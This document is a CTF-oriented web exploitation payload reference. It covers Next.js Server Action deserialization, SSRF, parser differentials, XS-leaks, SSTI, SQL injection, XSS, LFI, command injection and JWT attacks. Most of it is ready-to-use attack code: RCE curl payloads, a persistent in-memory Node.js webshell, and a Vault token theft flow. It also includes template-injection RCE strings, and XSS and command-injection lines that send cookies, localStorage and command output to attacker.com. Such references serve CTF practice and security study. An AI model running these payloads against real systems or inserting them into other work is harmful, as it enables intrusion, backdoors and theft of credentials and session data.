# Web Exploitation Payload Reference (CTF)

A comprehensive dictionary of exploit payloads, curl commands, and attack flows for modern CTF web challenges (2025–2026+).

---

## 1. Modern Framework & CVE Exploitation

### Next.js React2Shell (CVE-2025-55182) & RSC Flight Protocol Deserialization
**Target:** Next.js 14.x / 15.x / 16.0.6 with React 19 Server Components / Server Actions.  
**Vulnerability:** Deserialization of untrusted Flight protocol parameters in Server Actions. Traversing object prototypes via `constructor:constructor` reaches `Function`, allowing arbitrary in-memory Node.js code execution.

#### Discovery & Recon
Extract Server Action ID from HTML source or client bundle manifests:
```bash
# Grep for action IDs in Next.js build output
curl -s "$U" | grep -oE '"[a-f0-9]{40,}"'
curl -s "$U/_next/static/chunks/app/page-*.js" | grep -oE 'createServerReference\("[a-f0-9]+"'
```

#### Exploit Payload (Standard Flight Deserialization)
Send a POST request with the `Next-Action` header and multipart Flight payload:
```bash
curl -X POST "$U" \
  -H "Next-Action: <ACTION_ID_HASH>" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX" \
  --data-binary $'------WebKitFormBoundaryX\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1"}\r\n------WebKitFormBoundaryX\r\nContent-Disposition: form-data; name="1"\r\n\r\n{"$@":"$2"}\r\n------WebKitFormBoundaryX\r\nContent-Disposition: form-data; name="2"\r\n\r\n{"constructor:constructor":"Function(\\"return process.mainModule.require(\'child_process\').execSync(\'cat /flag*\').toString()\\")()"}\r\n------WebKitFormBoundaryX--\r\n'
```

#### Edge Filter & WAF Bypass (UTF-16LE Encoding Differential)
If an edge reverse proxy (e.g., Cloudflare, AWS WAF, custom reverse proxy) inspects body contents for `Function`, `process`, or `execSync`, encode each multipart part in UTF-16LE:
```bash
curl -X POST "$U" \
  -H "Next-Action: <ACTION_ID_HASH>" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX" \
  --data-binary $'------WebKitFormBoundaryX\r\nContent-Disposition: form-data; name="0"\r\nContent-Type: text/plain; charset=utf-16le\r\n\r\n<UTF-16LE_ENCODED_PAYLOAD>\r\n------WebKitFormBoundaryX--\r\n'
```

#### Persistent In-Memory Webshell (Monkeypatching HTTP Server)
Patch Node.js `http.Server.prototype.emit` to execute arbitrary commands without restarting:
```javascript
Function(`
  const http = process.mainModule.require('http');
  const cp = process.mainModule.require('child_process');
  const origEmit = http.Server.prototype.emit;
  http.Server.prototype.emit = function(event, req, res) {
    if (event === 'request' && req.headers['x-cmd']) {
      try {
        const out = cp.execSync(req.headers['x-cmd']).toString();
        res.writeHead(200, {'Content-Type': 'text/plain'});
        return res.end(out);
      } catch(e) {
        res.writeHead(500); return res.end(e.toString());
      }
    }
    return origEmit.apply(this, arguments);
  };
`)();
```

---

### RSC Server Action Request Forgery & SSRF (OpenBao / Vault Secret Theft)
**Target:** Applications using React Server Components with backend service clients (e.g. HashiCorp Vault / OpenBao).  
**Vulnerability:** Hidden or deprecated parameters accepted by server action handlers are sent to internal services without validation.

```bash
# 1. Trigger Server Action with SSRF parameter pointing to attacker webhook
curl -X POST "$U/account/settings" \
  -H "Next-Action: 8d2bf41e06c7e399c4b75a1372863920c567841e" \
  -H "Content-Type: multipart/form-data; boundary=----RSCBoundary" \
  --data-binary $'------RSCBoundary\r\nContent-Disposition: form-data; name="1_baoAddr"\r\n\r\nhttp://attacker.com:9999\r\n------RSCBoundary--\r\n'

# 2. Intercept X-Vault-Token header on attacker server:
#    POST /v1/auth/token/lookup-self HTTP/1.1
#    X-Vault-Token: s.5nK930X...

# 3. Read flag using stolen Vault token from internal service:
curl -H "X-Vault-Token: s.5nK930X..." "http://vault.internal:8200/v1/secret/data/flag"
```

---

### Traefik Routing Differentials & MLflow Path Traversal
**Target:** Traefik reverse proxy routing to Python / MLflow backend.  
**Vulnerability:** Traefik path normalization skips prefix authorization for encoded slashes (`/%2f`), while the backend decodes and handles the request.

#### Traefik 3.7.9 Auth Bypass
```bash
# Traefik PathPrefix(/api) rule bypassed via URL-encoded slash:
# Proxy checks: '/%2fapi/users' does NOT match '/api' prefix (passes without auth)
# Upstream backend normalizes: decodes '%2f' -> '/api/users'
curl -s "$U/%2fapi/admin/users"
```

#### MLflow 3.14.0 Artifact Root Path Traversal
```bash
# MLflow prompt source or artifact URI escapes artifact repository:
curl -X POST "$U/%2fapi/2.0/mlflow/runs/create" \
  -H "Content-Type: application/json" \
  -d '{"experiment_id": "0", "tags": [{"key": "mlflow.prompt.source", "value": ".."}]}'

# Read arbitrary host files (/flag or /etc/passwd) via artifact download:
curl -s "$U/%2fapi/2.0/mlflow/artifacts/get?run_uuid=<RUN_ID>&path=flag"
curl -s "$U/%2fapi/2.0/mlflow/artifacts/get?run_uuid=<RUN_ID>&path=etc/passwd"
```

---

### workerd / V8 Sandbox Escape (CVE-2022-1310)
**Target:** Cloudflare Workers runtime (workerd) or standalone V8.  
**Vulnerability:** Missing write barrier in `RegExp.prototype.exec` on `lastIndex` leads to heap memory corruption / Use-After-Free (UAF).

```javascript
// High-level trigger flow:
// 1. Corrupt double array length or object map via RegExp lastIndex UAF
// 2. Achieve addrof() and fakeobj() primitives
// 3. Locate WebAssembly instance code page (RWX memory)
// 4. Overwrite jump table with shellcode to execute setuid /readflag
const wasmInstance = new WebAssembly.Instance(wasmModule);
const codeAddr = leakWasmCodeAddress(wasmInstance);
writeMemory(codeAddr, shellcodeBytes); // RWX overwrite
wasmInstance.exports.main();           // Trigger shellcode
```

---

## 2. Parser & Encoding Differentials Dictionary

### js-yaml vs PyYAML
| Feature | js-yaml (Node.js) | PyYAML (Python) | Exploitation Impact |
| :--- | :--- | :--- | :--- |
| **Duplicate Merge Keys (`<<:`)** | First merge key wins | Last merge key wins (overwrites) | Role override: put user role first, admin role second |
| **Booleans (`yes`/`no`/`on`/`off`)** | String `"yes"` | Boolean `True`/`False` | Type confusion in validation vs parsing |
| **Duplicate Keys** | Last key wins | Last key wins (throws in custom SafeLoader) | Key injection |

```yaml
# Merge key differential payload:
user:
  <<: { role: "guest", permissions: ["read"] }
  <<: { role: "admin", permissions: ["read", "write", "admin"] }
# js-yaml parses role as "guest" (bypass gatekeeper)
# PyYAML parses role as "admin" (executes privileged action)
```

---

### json vs ujson (Python)
| Feature | Python `json` | Python `ujson` | Exploitation Impact |
| :--- | :--- | :--- | :--- |
| **Lone Surrogates (`\ud800`)** | Allowed or converted to surrogate pair | Stripped or triggers encoding boundary drop | Role or field shifting |
| **Duplicate Keys** | Keeps last occurrence | Keeps last occurrence (or shifts buffer) | Parameter pollution |
| **Escape Sequences** | Strict RFC 8259 | Permissive | String truncation past null or surrogate |

```python
# Payload with lone surrogate:
# json.loads sees {"role": "\ud800", "admin": true}
# ujson drops or truncates after surrogate:
payload = '{"role": "user\\ud800", "admin": true}'
```

---

### NFKC & Casefold Canonicalization
When an application validates input against an ASCII blacklist/whitelist *before* normalizing Unicode:

| Character | Unicode Point | NFKC / Casefold Result | Usage |
| :--- | :--- | :--- | :--- |
| `ｓｙｓｔｅｍ` | `\uff53\uff59\uff53\uff54\uff45\uff4d` | `system` | Evade keyword regex `/system/` |
| `ⓐdmin` | `\u24d0\u0064\u006d\u0069\u006e` | `admin` | Bypass username check |
| `ﬁle` | `\ufb01le` | `file` | Bypass path check `/file/` |
| `K` | `\u212a` (Kelvin sign) | `k` | Casefold collision with ASCII 'k' |
| `İ` | `\u0130` (Turkish I with dot) | `i` (after casefold) | Evade uppercase checks |

```python
# Quick test in python:
import unicodedata
s = "\uff53\uff59\uff53\uff54\uff45\uff4d"  # ｓｙｓｔｅｍ
assert "system" not in s                   # Passes naive blacklist
normalized = unicodedata.normalize("NFKC", s).casefold()
assert normalized == "system"              # Executes target command!
```

---

### Reverse Proxy vs Backend Path Normalization Matrix
Bypass path-based ACLs (e.g. `/admin`, `/api/internal`) when front proxy and backend interpret paths differently:

| Technique | Proxy Sees | Backend Sees | Target Framework |
| :--- | :--- | :--- | :--- |
| **Semicolon Matrix** | `/..;/admin` -> `/admin` | `/admin` (skips `/admin` rule) | Spring / Tomcat |
| **Double URL Encode** | `/%252e%252e%252fadmin` | `/admin` | Flask / Express |
| **Encoded Slash** | `/%2fapi/admin` | `/api/admin` | Traefik -> Flask/Gunicorn |
| **Trailing Dot** | `/admin.` | `/admin` | IIS / ASP.NET |
| **Duplicate Slashes** | `//admin` (mismatches `/admin`) | `/admin` | Nginx `merge_slashes off` |
| **Null Byte Double Encode**| `file.png%2500.jpg` | `file.png\x00` | Python `split('\x00')[0]` |

```bash
# Path traversal via double-URL-encoded null byte:
curl -s "$U/download?file=..%2f..%2f..%2fflag%2500.png"
```

---

### urllib.parse vs requests Host Confusion (SSRF)
```python
# urllib.parse splits authority on '@', while requests / curl handles '\@' differently:
url = "http://attacker.com\\@legitimate.com"
# urllib.parse.urlparse(url).hostname -> "legitimate.com" (passes validation)
# requests.get(url) connects to -> "attacker.com" (triggers SSRF)
```

---

## 3. XS-Leaks & Client-Side Oracles

### Frame Counting Oracle (`window.open` / `window.length`)
If a target search endpoint embeds an iframe or media element only on positive search results, `window.length` leaks match cross-origin.

```html
<!-- Hosted on attacker server -->
<script>
async function probe(char) {
  let guess = "flag{" + char;
  let win = window.open("http://victim.local/search?q=" + encodeURIComponent(guess));
  await new Promise(r => setTimeout(r, 400));
  let count = win.length; // Number of frames
  win.close();
  if (count > 0) {
    // Leaked match!
    fetch("http://attacker.com/leak?found=" + encodeURIComponent(guess));
  }
}
</script>
```

---

### CSS-Injection Prefix Oracle (Sanitizer & CSP Bypass)
Attribute selectors leak input values, CSRF tokens, or hidden flags char-by-char:

```css
/* Inject into page via SVG, markdown, or rich text */
input[name="csrf"][value^="flag{a"] { background: url("http://attacker.com/leak?c=a"); }
input[name="csrf"][value^="flag{b"] { background: url("http://attacker.com/leak?c=b"); }
input[name="csrf"][value^="flag{c"] { background: url("http://attacker.com/leak?c=c"); }
```

#### SVG Sanitizer Bypass (`svg-hush` / `image-set`)
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <style>
    input[value^="a"] {
      background-image: image-set("http://attacker.com/leak?c=a" 1x);
    }
  </style>
</svg>
```

---

### Status-Code Leak via Error Events (403 vs 404 / 200)
When an endpoint responds with 403 Forbidden on existing protected files but 404 Not Found on nonexistent files:

```html
<script>
function testPath(path) {
  let img = new Image();
  // 403 vs 404 timing or onerror event trigger
  img.onerror = () => { /* Server rejected file (403) -> File EXISTS */ };
  img.onload = () => { /* 200 OK */ };
  img.src = "http://victim.local/download?file=" + encodeURIComponent(path);
}
</script>
```

---

## 4. Modern Auth & Session Quirks

### bcrypt 72-Byte Truncation Collision & Oracle
bcrypt algorithms discard all input bytes beyond index 71 (`pw[0:72]`).

#### Collision Proof-of-Concept
```python
# python3 -c "import bcrypt" 2>/dev/null || pip install --user bcrypt
import bcrypt

# Any two strings sharing the first 72 bytes produce the SAME hash
base = b"A" * 72
pass1 = base + b"SECRET_ADMIN_TOKEN_XYZ"
pass2 = base + b"DIFFERENT_JUNK_DATA_123"

salt = bcrypt.gensalt()
h1 = bcrypt.hashpw(pass1, salt)
assert bcrypt.checkpw(pass2, h1)  # TRUE! Authentication bypass!
```

#### Byte-at-a-Time Secret Leak Flow
When an application hashes `user_input + secret_token`:
1. Submit `user_input = "A" * 71`.
2. The 72nd byte is `secret_token[0]`. Bytes `secret_token[1:]` are truncated away.
3. Brute force all 256 possible bytes for character 72 by comparing hashes or password verify.
4. Next round: submit `user_input = "A" * 70 + leaked_char[0]`. The 72nd byte is now `secret_token[1]`.
5. Repeat for full secret.

---

### Express Middleware Ordering & `_method` Override CSRF Bypass
If `express.urlencoded()` runs before `methodOverride()` and `csurf`:

```javascript
// Vulnerable middleware order:
app.use(express.urlencoded({ extended: false }));
app.use(methodOverride('_method'));
app.use(csrfProtection); // csurf checks only POST/PUT/DELETE, ignores GET!
```

#### Exploit Request
A state-changing POST endpoint can be invoked while bypassing CSRF protection by specifying `_method=GET` in query string or form data:
```bash
curl -X POST "$U/account/change-password?_method=GET" \
  -d "new_password=hacked123"
```

---

### Rust `/proc/self/mem` Arbitrary 1-Byte Code Patching
In Linux environments, an arbitrary write to `/proc/self/mem` can modify executable memory (`r-xp`) even when `mprotect` would normally prevent it.

#### Exploit Steps:
1. **Leak Base Address:** Use path traversal (e.g. `?room=/proc/self/maps`) to leak process base (PIE).
2. **Locate Target Instruction:** Disassemble target binary locally to find conditional jump:
   ```asm
   test eax, eax
   jz   access_denied  ; opcode 0x74
   ```
3. **Patch Instruction:** Open `/proc/self/mem` via file write primitive, seek to instruction address, write `0xEB` (`jmp` unconditional) or `0x90` (`nop`).
4. **Trigger:** Re-issue the request; privileged check passes automatically.

---

### SQLite Double-Quoted Column Name Fallback
In SQLite, double quotes around a literal token fallback to column names if the string matches an existing table column (MySQL compatibility behavior):

```sql
-- If column "age" exists on table users:
UPDATE users SET crew = "age" WHERE id = 1;
-- Compiles to: crew = age (sets crew id equal to age column value!)
-- Bypasses string type checks or invitations.
```

---

## 5. SSTI (Server-Side Template Injection)

### Detection Matrix
Probe: `{{7*7}}` or `${7*7}` or `<%= 7*7 %>`
- `{{7*7}}` -> 49: Jinja2 (Flask/Python), Twig (PHP), Nunjucks (Node)
- `{{7*'7'}}` -> `7777777` (Jinja2), `49` (Twig)
- `${7*7}` -> 49: FreeMarker, Spring EL, Thymeleaf
- `<%= 7*7 %>` -> 49: ERB (Ruby), EJS (Node)

### Jinja2 (Python) RCE Payloads
```jinja2
{{ cycler.__init__.__globals__.os.popen('cat /flag*').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[137]('cat /flag',shell=True,stdout=-1).communicate()[0] }}
```
**Bypasses:**
- Hex escapes: `{{ ''['\x5f\x5fclass\x5f\x5f'] }}`
- Attr filter: `{{ request|attr('application') }}`
- Underscore bypass: `{{ request['__cl'+'ass__'] }}`

### Twig (PHP) RCE Payloads
```twig
{{ ['id']|filter('system') }}
{{ ['cat /flag*']|map('system')|join }}
{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}
```

### FreeMarker (Java) RCE
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

### Nunjucks / EJS (Node.js) RCE
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

---

## 6. SQL Injection (SQLi) Reference

### Quick Probes & Comments
```sql
' OR '1'='1'-- -
" OR "1"="1"-- -
' UNION SELECT 1,2,3-- -
```

### Extract Data by DBMS
| DBMS | Schema / Tables | Current User / DB | Version |
| :--- | :--- | :--- | :--- |
| **MySQL** | `information_schema.tables` | `user()`, `database()` | `@@version` |
| **PostgreSQL**| `information_schema.tables` | `current_user`, `current_database()` | `version()` |
| **SQLite** | `sqlite_master` | N/A | `sqlite_version()` |
| **MSSQL** | `sys.tables` | `user_name()`, `db_name()` | `@@version` |

### Blind SQLi Techniques
```sql
-- SQLite substring leak:
' AND unicode(substr((SELECT flag FROM flags LIMIT 1), 1, 1)) = 102-- -

-- Time-based blind:
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -          -- MySQL
' AND 1=(SELECT 1 FROM pg_sleep(5))-- -                -- PostgreSQL
'; WAITFOR DELAY '0:0:5'-- -                           -- MSSQL
```

---

## 7. XSS & CSP Bypasses

```html
<!-- Exfil cookies / DOM -->
<script>fetch('//attacker.com/leak?c='+encodeURIComponent(document.cookie))</script>
<img src=x onerror="fetch('//attacker.com/leak?f='+encodeURIComponent(document.body.innerText))">
<svg/onload="fetch('//attacker.com/leak?f='+encodeURIComponent(localStorage.getItem('flag')))">

<!-- CSP Bypasses -->
<!-- Allowed CDN script gadget: -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
<div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>

<!-- Base tag hijack: -->
<base href="https://attacker.com/">
```

---

## 8. LFI & PHP Wrappers

```bash
# Read source code base64 encoded:
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=string.rot13/resource=index.php

# Remote code execution via data wrapper:
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id

# Procfs inspection:
/proc/self/cmdline
/proc/self/environ
/proc/self/maps
/proc/self/fd/0
```

---

## 9. Command Injection Bypasses

```bash
# Separators
; | || && `cmd` $(cmd) %0a %0d

# Space filters
${IFS}
$IFS$9
<
{cat,/flag}

# Keyword filters
c''at /fl*
/???/c?t /f??g
echo$IFS$9"Y2F0IC9mbGFnCg=="|base64$IFS-d|sh

# Blind out-of-band exfil
; curl "http://attacker.com/$(id|base64)"
; nslookup $(whoami).attacker.com
```

---

## 10. JWT (JSON Web Token) Exploitation

```bash
# None algorithm attack:
jwt_tool <token> -X a

# Crack secret with rockyou:
jwt_tool <token> -C -d /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat -m 16500 jwt.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

# RS256 -> HS256 key confusion:
jwt_tool <token> -S hs256 -k public_key.pem

# Header parameter injection (kid path traversal):
# Set header {"alg": "HS256", "kid": "/dev/null"} with HMAC key ""
jwt_tool <token> -T -S hs256 -p "" --header '{"kid":"/dev/null"}'
```
